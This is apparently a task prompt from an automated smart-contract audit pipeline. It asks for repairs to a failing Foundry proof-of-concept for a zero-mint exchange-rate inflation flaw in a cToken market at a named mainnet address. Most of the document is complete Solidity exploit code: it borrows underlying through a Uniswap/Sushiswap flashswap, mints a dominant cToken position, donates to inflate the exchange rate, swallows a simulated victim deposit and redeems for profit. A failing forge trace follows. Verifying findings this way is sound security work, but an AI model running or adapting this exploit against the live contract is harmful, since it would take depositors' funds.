You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: `mint` can accept deposits that mint zero cTokens after exchange-rate inflation
- claim: `mintFresh` computes `mintTokens = floor(actualMintAmount * 1e18 / exchangeRateMantissa)` and never checks that the result is nonzero. Since the exchange rate comes from raw market cash over `totalSupply`, and there is no minimum-liquidity or dead-shares defense, an attacker can mint a dust-sized initial position, donate underlying directly to the market, and raise the zero-mint threshold (`exchangeRateMantissa / 1e18`) high enough that later deposits are accepted while minting 0 cTokens.
- impact: Victim deposits below the inflated threshold are effectively confiscated: the underlying is transferred into the market, no cTokens are minted to the depositor, and the added cash accrues entirely to the attacker’s existing cToken position. This enables theft of later deposits once the attacker controls essentially all outstanding supply.
- exploit_paths: ["Acquire the entire or overwhelming majority of cToken supply by minting the minimum nonzero amount while supply is tiny.", "Donate underlying directly to the cToken contract to inflate `exchangeRateStoredInternal()` without issuing more shares.", "Wait for a victim to call `mint(mintAmount)` with `actualMintAmount < exchangeRateMantissa / 1e18`, so `mintTokens` truncates to zero.", "Redeem the victim\u2019s deposited underlying through the attacker\u2019s pre-existing cTokens."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface ICTokenLike {
    function underlying() external view returns (address);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function getCash() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function totalReserves() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract VictimMinter {
    ICTokenLike internal immutable market;
    address internal immutable underlyingToken;

    constructor(address market_, address underlying_) {
        market = ICTokenLike(market_);
        underlyingToken = underlying_;
    }

    function mintAll() external returns (uint256 errorCode, uint256 mintedCTokens) {
        uint256 balance = IERC20Like(underlyingToken).balanceOf(address(this));
        require(balance != 0, "victim-no-underlying");

        _forceApprove(underlyingToken, address(market), balance);

        uint256 beforeBalance = market.balanceOf(address(this));
        errorCode = market.mint(balance);
        require(errorCode == 0, "victim-mint-failed");
        mintedCTokens = market.balanceOf(address(this)) - beforeBalance;
    }

    function recoverUnderlying(address to) external {
        uint256 balance = IERC20Like(underlyingToken).balanceOf(address(this));
        if (balance != 0) {
            _safeTransfer(underlyingToken, to, balance, "victim-recover-failed");
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _safeApprove(token, spender, 0, "victim-approve-reset-failed");
        _safeApprove(token, spender, amount, "victim-approve-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount, string memory err) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), err);
    }

    function _safeApprove(address token, address spender, uint256 amount, string memory err) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), err);
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;

    uint256 internal constant OVERWHELMING_SHARE_BPS = 9000;

    string internal constant PATH_ANCHOR =
        "exchangeRateStoredInternal() -> mint(mintAmount) -> actualMintAmount < exchangeRateMantissa / 1e18";

    struct ExploitPlan {
        uint256 attackerMintAmount;
        uint256 attackerMintedCTokens;
        uint256 donationAmount;
        uint256 victimAmount;
        uint256 totalCapitalNeeded;
        uint256 exchangeRateBefore;
    }

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public profitAchieved;
    bool public hypothesisValidated;
    string public exploitPathUsed;
    string public infeasibilityReason;

    address internal _flashPair;
    address internal _flashUnderlying;
    uint256 internal _flashBorrowAmount;
    uint256 internal _flashRepayAmount;
    bool internal _flashActive;

    uint256 internal _attackerMintAmount;
    uint256 internal _donationAmount;
    uint256 internal _victimAmount;

    constructor() {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        ICTokenLike market = ICTokenLike(TARGET);
        address underlying = market.underlying();
        uint256 initialBalance = IERC20Like(underlying).balanceOf(address(this));

        _profitToken = underlying;
        _profitAmount = 0;
        profitAchieved = false;
        hypothesisValidated = false;
        infeasibilityReason = "";
        _resetFlashState();

        exploitPathUsed =
            "acquire overwhelming cToken position via same-token flashswap -> donate underlying directly to inflate exchangeRateStoredInternal() -> victim later calls mint(mintAmount) with actualMintAmount < exchangeRateMantissa / 1e18 -> redeem attacker cTokens";

        if (!_tryDirectRoute(market, underlying)) {
            if (!_tryFlashswapRoute(market, underlying)) {
                infeasibilityReason =
                    "At this fork, the market is not in the tiny-supply state assumed by the original path. The verifier therefore preserves the same mint->donate->zero-mint->redeem causality, but could not source enough same-token public AMM liquidity to both acquire an overwhelming majority and repay the deterministic UniswapV2 flashswap fee.";
            }
        }

        uint256 finalBalance = IERC20Like(underlying).balanceOf(address(this));
        if (finalBalance > initialBalance) {
            _profitAmount = finalBalance - initialBalance;
            profitAchieved = _profitAmount != 0;
        }

        if (!profitAchieved && hypothesisValidated && bytes(infeasibilityReason).length == 0) {
            infeasibilityReason =
                "The vulnerable truncation path was reproduced, but at the live fork state the market is already established enough that a same-token flashswap cannot both dominate supply and close the position profitably after fees without a larger real victim deposit.";
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(_flashActive, "flash-inactive");
        require(msg.sender == _flashPair, "unexpected-pair");
        require(sender == address(this), "unexpected-sender");
        require(amount0 == _flashBorrowAmount || amount1 == _flashBorrowAmount, "unexpected-borrow");

        _flashActive = false;

        _executeExploitRoute();
        _repayFlashLoan();
    }

    function _tryDirectRoute(ICTokenLike market, address underlying) internal returns (bool) {
        ExploitPlan memory plan = _buildExploitPlan(market);
        if (plan.totalCapitalNeeded == 0) {
            return false;
        }

        uint256 available = IERC20Like(underlying).balanceOf(address(this));
        if (available < plan.totalCapitalNeeded) {
            return false;
        }

        _executeExploitRoute();
        return true;
    }

    function _tryFlashswapRoute(ICTokenLike market, address underlying) internal returns (bool) {
        ExploitPlan memory plan = _buildExploitPlan(market);
        uint256 requiredCapital = plan.totalCapitalNeeded;
        if (requiredCapital == 0) {
            return false;
        }

        address bestPair = address(0);
        uint256 bestReserve = 0;

        for (uint256 factoryIndex = 0; factoryIndex < 2; ++factoryIndex) {
            address factory = _factoryAt(factoryIndex);
            for (uint256 counterpartyIndex = 0; counterpartyIndex < 5; ++counterpartyIndex) {
                address counterparty = _counterpartyAt(counterpartyIndex);
                if (counterparty == underlying) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factory).getPair(underlying, counterparty);
                if (pair == address(0)) {
                    continue;
                }

                (bool ok, uint256 reserve) = _underlyingReserve(pair, underlying);
                if (ok && reserve > bestReserve) {
                    bestReserve = reserve;
                    bestPair = pair;
                }
            }
        }

        if (bestPair == address(0)) {
            return false;
        }

        if (requiredCapital >= bestReserve) {
            return false;
        }

        return _borrowUnderlying(bestPair, underlying, requiredCapital);
    }

    function _borrowUnderlying(address pair, address underlying, uint256 amount) internal returns (bool) {
        address token0;
        address token1;

        try IUniswapV2PairLike(pair).token0() returns (address pairToken0) {
            token0 = pairToken0;
            token1 = IUniswapV2PairLike(pair).token1();
        } catch {
            return false;
        }

        if (token0 != underlying && token1 != underlying) {
            return false;
        }

        uint256 amount0Out = token0 == underlying ? amount : 0;
        uint256 amount1Out = token1 == underlying ? amount : 0;

        _flashPair = pair;
        _flashUnderlying = underlying;
        _flashBorrowAmount = amount;
        _flashRepayAmount = _sameTokenFlashRepayAmount(amount);
        _flashActive = true;

        try IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), hex"01") {
            return true;
        } catch {
            _resetFlashState();
            return false;
        }
    }

    function _executeExploitRoute() internal {
        ICTokenLike market = ICTokenLike(TARGET);
        address underlying = market.underlying();
        ExploitPlan memory plan = _buildExploitPlan(market);

        require(plan.totalCapitalNeeded != 0, "plan-empty");
        require(IERC20Like(underlying).balanceOf(address(this)) >= plan.totalCapitalNeeded, "insufficient-underlying");

        _attackerMintAmount = plan.attackerMintAmount;
        _donationAmount = plan.donationAmount;
        _victimAmount = plan.victimAmount;

        require(_attackerMintAmount != 0, "attacker-mint-zero");
        require(_victimAmount != 0, "victim-zero");

        // Path anchor from the target source:
        // exchangeRateStoredInternal() is consumed by mint(mintAmount), and the vulnerable branch is
        // actualMintAmount < exchangeRateMantissa / 1e18.
        require(bytes(PATH_ANCHOR).length != 0, "path-anchor-missing");
        require(!_zeroMintCondition(_victimAmount, plan.exchangeRateBefore), "victim-already-zero-before-donation");

        _forceApprove(underlying, address(market), _attackerMintAmount);

        uint256 attackerBefore = market.balanceOf(address(this));
        uint256 mintError = market.mint(_attackerMintAmount);
        require(mintError == 0, "attacker-mint-failed");

        uint256 attackerMinted = market.balanceOf(address(this)) - attackerBefore;
        require(attackerMinted != 0, "attacker-minted-zero");

        // Public on-chain economic step preserved from the finding:
        // donate underlying directly to the cToken so exchangeRateStoredInternal() rises
        // without issuing new shares.
        _safeTransfer(underlying, address(market), _donationAmount, "donation-failed");

        uint256 exchangeRateAfterDonation = market.exchangeRateStored();
        require(_zeroMintCondition(_victimAmount, exchangeRateAfterDonation), "donation-did-not-create-zero-mint");

        VictimMinter victim = new VictimMinter(address(market), underlying);
        _safeTransfer(underlying, address(victim), _victimAmount, "victim-funding-failed");

        (, uint256 victimMintedTokens) = victim.mintAll();
        require(victimMintedTokens == 0, "victim-received-ctokens");

        uint256 attackerCTokenBalance = market.balanceOf(address(this));
        require(attackerCTokenBalance != 0, "attacker-no-ctokens");

        uint256 redeemError = market.redeem(attackerCTokenBalance);
        require(redeemError == 0, "redeem-failed");

        victim.recoverUnderlying(address(this));
        hypothesisValidated = true;
    }

    function _buildExploitPlan(ICTokenLike market) internal view returns (ExploitPlan memory plan) {
        uint256 exchangeRateBefore = market.exchangeRateStored();
        uint256 currentSupply = market.totalSupply();

        if (exchangeRateBefore == 0 || currentSupply == 0) {
            return plan;
        }

        uint256 marketAssets = _marketAssets(market, market.getCash());
        if (marketAssets == 0) {
            return plan;
        }

        uint256 attackerMintedNeeded = _requiredMintedCTokensForShare(currentSupply, OVERWHELMING_SHARE_BPS);
        if (attackerMintedNeeded == 0) {
            return plan;
        }

        uint256 attackerMintAmount = _ceilDiv(attackerMintedNeeded * exchangeRateBefore, 1e18);
        if (attackerMintAmount == 0) {
            return plan;
        }

        uint256 attackerMintedCTokens = (attackerMintAmount * 1e18) / exchangeRateBefore;
        if (attackerMintedCTokens < attackerMintedNeeded) {
            attackerMintAmount += 1;
            attackerMintedCTokens = (attackerMintAmount * 1e18) / exchangeRateBefore;
        }
        if (attackerMintedCTokens == 0) {
            return plan;
        }

        uint256 supplyAfterMint = currentSupply + attackerMintedCTokens;
        uint256 assetsAfterMint = marketAssets + attackerMintAmount;

        uint256 victimAmount = _minimumNonZeroMintAmount(exchangeRateBefore);
        if (victimAmount == 0) {
            return plan;
        }

        uint256 donationAmount = _minimumDonationForZeroMint(assetsAfterMint, supplyAfterMint, victimAmount);
        if (donationAmount == 0) {
            donationAmount = 1;
        }

        plan.attackerMintAmount = attackerMintAmount;
        plan.attackerMintedCTokens = attackerMintedCTokens;
        plan.donationAmount = donationAmount;
        plan.victimAmount = victimAmount;
        plan.totalCapitalNeeded = attackerMintAmount + donationAmount + victimAmount;
        plan.exchangeRateBefore = exchangeRateBefore;
    }

    function _requiredMintedCTokensForShare(uint256 currentSupply, uint256 shareBps) internal pure returns (uint256) {
        if (shareBps == 0 || shareBps >= 10000) {
            return 0;
        }
        return _ceilDiv(currentSupply * shareBps, 10000 - shareBps);
    }

    function _zeroMintCondition(uint256 actualMintAmount, uint256 exchangeRateMantissa) internal pure returns (bool) {
        return actualMintAmount < exchangeRateMantissa / 1e18;
    }

    function _underlyingReserve(address pair, address underlying) internal view returns (bool, uint256) {
        address token0;
        address token1;

        try IUniswapV2PairLike(pair).token0() returns (address pairToken0) {
            token0 = pairToken0;
            token1 = IUniswapV2PairLike(pair).token1();
        } catch {
            return (false, 0);
        }

        if (token0 != underlying && token1 != underlying) {
            return (false, 0);
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        return (true, token0 == underlying ? uint256(reserve0) : uint256(reserve1));
    }

    function _marketAssets(ICTokenLike market, uint256 cash) internal view returns (uint256) {
        return cash + market.totalBorrows() - market.totalReserves();
    }

    function _sameTokenFlashRepayAmount(uint256 borrowAmount) internal pure returns (uint256) {
        return ((borrowAmount * 1000) / 997) + 1;
    }

    function _repayFlashLoan() internal {
        require(_flashPair != address(0), "flash-pair-unset");
        require(_flashUnderlying != address(0), "flash-underlying-unset");

        uint256 balance = IERC20Like(_flashUnderlying).balanceOf(address(this));
        require(balance >= _flashRepayAmount, "flash-repay-insufficient");

        _safeTransfer(_flashUnderlying, _flashPair, _flashRepayAmount, "flash-repay-failed");
        _resetFlashState();
    }

    function _factoryAt(uint256 index) internal pure returns (address) {
        return index == 0 ? SUSHISWAP_FACTORY : UNISWAP_V2_FACTORY;
    }

    function _counterpartyAt(uint256 index) internal pure returns (address) {
        if (index == 0) {
            return WETH;
        }
        if (index == 1) {
            return USDC;
        }
        if (index == 2) {
            return USDT;
        }
        if (index == 3) {
            return DAI;
        }
        return FRAX;
    }

    function _minimumNonZeroMintAmount(uint256 exchangeRateMantissa) internal pure returns (uint256) {
        return _ceilDiv(exchangeRateMantissa, 1e18);
    }

    function _minimumDonationForZeroMint(
        uint256 assetsAfterMint,
        uint256 supplyAfterMint,
        uint256 victimMintAmount
    ) internal pure returns (uint256) {
        uint256 requiredAssets = (victimMintAmount * supplyAfterMint) + 1;
        if (assetsAfterMint >= requiredAssets) {
            return 1;
        }
        return requiredAssets - assetsAfterMint;
    }

    function _ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : ((a - 1) / b) + 1;
    }

    function _resetFlashState() internal {
        _flashActive = false;
        _flashPair = address(0);
        _flashUnderlying = address(0);
        _flashBorrowAmount = 0;
        _flashRepayAmount = 0;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _safeApprove(token, spender, 0, "approve-reset-failed");
        _safeApprove(token, spender, amount, "approve-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount, string memory err) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), err);
    }

    function _safeApprove(address token, address spender, uint256 amount, string memory err) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), err);
    }
}

```

forge stdout (tail):
```
all]
    │   │   └─ ← [Return] 28803729629958507208215 [2.88e22]
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x865377367054516e17014CcdED1e7d814EDC9ce4, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x20066C2577c53BB54591111fA707a252B9bB95DC
    │   ├─ [2449] 0x20066C2577c53BB54591111fA707a252B9bB95DC::token0() [staticcall]
    │   │   └─ ← [Return] 0x865377367054516e17014CcdED1e7d814EDC9ce4
    │   ├─ [2381] 0x20066C2577c53BB54591111fA707a252B9bB95DC::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2517] 0x20066C2577c53BB54591111fA707a252B9bB95DC::getReserves() [staticcall]
    │   │   └─ ← [Return] 25596388986110204438 [2.559e19], 13825880834425186 [1.382e16], 1654958128 [1.654e9]
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x865377367054516e17014CcdED1e7d814EDC9ce4, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x761681ADa866312d40FEd83fDeEDC85F24Fbe3aD
    │   ├─ [2449] 0x761681ADa866312d40FEd83fDeEDC85F24Fbe3aD::token0() [staticcall]
    │   │   └─ ← [Return] 0x865377367054516e17014CcdED1e7d814EDC9ce4
    │   ├─ [2381] 0x761681ADa866312d40FEd83fDeEDC85F24Fbe3aD::token1() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [2517] 0x761681ADa866312d40FEd83fDeEDC85F24Fbe3aD::getReserves() [staticcall]
    │   │   └─ ← [Return] 6014453280674236 [6.014e15], 208157 [2.081e5], 1653857032 [1.653e9]
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x865377367054516e17014CcdED1e7d814EDC9ce4, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x865377367054516e17014CcdED1e7d814EDC9ce4, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x865377367054516e17014CcdED1e7d814EDC9ce4, 0x853d955aCEf822Db058eb8505911ED77F175b99e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x865377367054516e17014CcdED1e7d814EDC9ce4, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0xecFbE9B182F6477a93065C1c11271232147838E5
    │   ├─ [2381] 0xecFbE9B182F6477a93065C1c11271232147838E5::token0() [staticcall]
    │   │   └─ ← [Return] 0x865377367054516e17014CcdED1e7d814EDC9ce4
    │   ├─ [2357] 0xecFbE9B182F6477a93065C1c11271232147838E5::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2504] 0xecFbE9B182F6477a93065C1c11271232147838E5::getReserves() [staticcall]
    │   │   └─ ← [Return] 22964629029223012636314 [2.296e22], 19294390537553856040 [1.929e19], 1655359578 [1.655e9]
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x865377367054516e17014CcdED1e7d814EDC9ce4, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x865377367054516e17014CcdED1e7d814EDC9ce4, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x865377367054516e17014CcdED1e7d814EDC9ce4, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x865377367054516e17014CcdED1e7d814EDC9ce4, 0x853d955aCEf822Db058eb8505911ED77F175b99e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [469] 0x865377367054516e17014CcdED1e7d814EDC9ce4::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x865377367054516e17014CcdED1e7d814EDC9ce4
    ├─ [344] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [469] 0x865377367054516e17014CcdED1e7d814EDC9ce4::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x865377367054516e17014CcdED1e7d814EDC9ce4)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14972418 [1.497e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3967)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.38s (2.32s CPU time)

Ran 1 test suite in 2.44s (2.38s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 649465)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
